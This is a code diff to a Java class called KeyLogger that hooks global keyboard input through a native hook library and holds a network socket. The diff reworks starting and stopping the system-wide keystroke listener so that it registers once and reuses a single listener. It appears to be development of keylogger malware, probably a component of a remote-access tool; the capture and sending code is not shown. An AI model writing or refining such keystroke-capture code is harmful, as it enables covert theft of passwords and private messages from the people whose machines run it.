@@ -10,16 +10,13 @@ import java.net.Socket;
 import java.sql.Timestamp;
 
 public class KeyLogger implements NativeKeyListener, SendRecv {
-    private static boolean isStart = false;
+    public boolean isStart = false;
     private Socket connect;
+    private NativeKeyListener nativeKeyListener;
 
     public void stopKeyLogger() {
         if (isStart) {
-            try {
-                GlobalScreen.unregisterNativeHook();
-            } catch (NativeHookException e) {
-                throw new RuntimeException(e);
-            }
+            GlobalScreen.removeNativeKeyListener(nativeKeyListener);
             isStart = false;
         }
     }
@@ -39,6 +36,7 @@ public class KeyLogger implements NativeKeyListener, SendRecv {
 
     public KeyLogger(Socket connect) {
         this.connect = connect;
+        nativeKeyListener = this;
     }
 
     public void startKeyLog() {
@@ -46,12 +44,16 @@ public class KeyLogger implements NativeKeyListener, SendRecv {
             return;
         }
 
-        try {
-            GlobalScreen.registerNativeHook();
-        } catch (NativeHookException ex) {
-            System.err.println("There was a problem registering the native hook.");
-            System.err.println(ex.getMessage());
+        if (!GlobalScreen.isNativeHookRegistered()) {
+            try {
+                GlobalScreen.registerNativeHook();
+            } catch (NativeHookException ex) {
+                System.err.println("There was a problem registering the native hook.");
+                System.err.println(ex.getMessage());
+            }
         }
-        GlobalScreen.addNativeKeyListener(new KeyLogger(connect));
+
+        GlobalScreen.addNativeKeyListener(nativeKeyListener);
+        isStart = true;
     }
 }
